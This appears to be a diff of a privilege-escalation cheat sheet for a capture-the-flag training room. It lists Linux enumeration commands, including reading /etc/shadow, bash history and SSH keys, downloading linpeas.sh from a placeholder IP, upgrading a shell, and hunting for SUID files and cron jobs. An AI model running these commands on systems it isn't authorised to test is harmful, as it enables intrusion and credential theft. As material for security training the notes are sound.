@@ -9,21 +9,9 @@ image: https://tryhackme-images.s3.amazonaws.com/room-icons/04afd126bf7a729eec5f
 # Privilege Escalation
 
 
-````
-------------------------------------------------
-- sudo -l
-- uname -r 
-- python -m http.server 80 | wget http://IP/linpeas.sh
-- ps aux | ps -ef
-- cat /etc/passwd | cat /etc/shadow | cat /etc/group
-- cat ~/.bash_history
-- cat ~/.ssh/authorized_keys
------------------------------------------------
-````
+## Automated Scripts 
 
 ````
-Automated Scripts 
-
 linPEAS.sh
 LinEnum.sh
 linuxprivchecker.py
@@ -31,10 +19,9 @@ unix-privesc-check
 metasploit: multi/recon/local_exploit_suggester
 ````
 
+## Interactive Shell 
 
 ````
-Interactive Shell 
-
 python -c 'import pty;pty.spawn("/bin/bash");'  
 ctrl z  
 echo $TERM  
@@ -49,9 +36,10 @@ export SHELL=bash
 stty rows \<> colums \<> 
 ````
 
-````
-Application Config Files 
 
+## Application Config Files 
+
+````
 cat /etc/syslog.conf
 cat /etc/chttp.conf
 cat /etc/lighttpd.conf
@@ -64,9 +52,9 @@ cat /opt/lampp/etc/httpd.conf
 ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 ````
 
-````
-Cronjobs
+## Cronjobs
 
+````
 crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
@@ -82,9 +70,10 @@ cat /var/spool/cron/crontabs/root
 ls -al /var/cron.log - check timestamps 
 ````
 
-````
-Network
+## Network
 
+````
+N
 /sbin/ifconfig -a
 cat /etc/network/interfaces
 cat /etc/sysconfig/network
@@ -99,8 +88,9 @@ hostname
 dnsdomainname
 ````
 
+## SUID Files
+
 ````
-SUID Files
 
 find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
 find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
@@ -115,9 +105,9 @@ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev
 find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
 ````
 
-````
-İnfo
+## İnfo
 
+````
 id
 who
 w
